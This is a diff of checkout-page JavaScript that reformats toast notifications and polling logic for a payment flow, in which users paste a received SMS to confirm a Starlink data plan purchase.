-                            'Try Again',
-                            () => {
-                                window.location.href = '/checkout/?' + new URLSearchParams({
-                                    plan: planName,
-                                    data: planData,
-                                    price: planPrice
-                                }).toString();
-                            }
-                        );
-
+                        showToast('error', 'Wrong SMS', data.message || 'You pasted the wrong SMS. Ensure your details match this order to complete the payment.', 'Try Again', () => {
+                            window.location.href = '/checkout/?' + new URLSearchParams({ plan: planName, data: planData, price: planPrice }).toString();
+                        });
                     } else if (data.status === 'reminder_sent') {
-                        // Don't stop polling; just show the reminder once per reminder count
-                        // Use a simple counter so we don't spam — show only on state change
                         if (lastReminderCount === 0) {
                             lastReminderCount = 1;
-                            showToast(
-                                'info',
-                                'A Gentle Reminder',
-                                data.message || 'Kindly check your inbox and copy the message you have received, then paste it here. We are almost there — just one more step to unlock your Starlink connection!',
-                                'OK, Got It',
-                                null,
-                                true
-                            );
+                            showToast('info', 'A Gentle Reminder', data.message || 'Kindly check your inbox and copy the message you have received, then paste it here. We are almost there — just one more step to unlock your Starlink connection!', 'OK, Got It', null);
                         }
-
                     } else if (data.status === 'timeout') {
                         clearInterval(pollTimer);
                         waitingOverlay.classList.remove('open');
-                        showToast(
-                            'error',
-                            'Session Expired',
-                            'Please start the payment again from the plans page.',
-                            'OK',
-                            () => {
-                                window.location.href = '/plans/';
-                            }
-                        );
+                        showToast('error', 'Session Expired', 'Please start the payment again from the plans page.', 'OK', () => {
+                            window.location.href = '/plans/';
+                        });
                     }
-                } catch (err) {
-                    // retry silently
-                }
+                } catch (err) {}
             }, 2000);
         }
 
-        // ============================================
-        // SHOW TOAST
-        // ============================================
         let toastAction = null;
 
-        function showToast(type, title, text, buttonLabel, action, keepWaitingOpen) {
+        function showToast(type, title, text, buttonLabel, action) {
             toastIcon.className = 'toast-icon ' + (type === 'info' ? 'info' : 'error');
-            toastIcon.innerHTML = type === 'info'
-                ? '<i class="uil uil-bell"></i>'
-                : '<i class="uil uil-exclamation-triangle"></i>';
-
+            toastIcon.innerHTML = type === 'info' ? '<i class="uil uil-bell"></i>' : '<i class="uil uil-exclamation-triangle"></i>';
             toastTitle.textContent = title;
             toastText.innerHTML = text;
             toastBtn.textContent = buttonLabel || 'OK, Got It';
-
             toastAction = action || null;
-
             toastOverlay.classList.add('open');
             setTimeout(() => toastCard.classList.add('show'), 50);
         }
@@ -1017,7 +534,6 @@
             if (typeof action === 'function') {
                 setTimeout(action, 250);
             } else {
-                // Keep polling for reminder (no action needed)
                 document.body.classList.remove('modal-open');
             }
         });
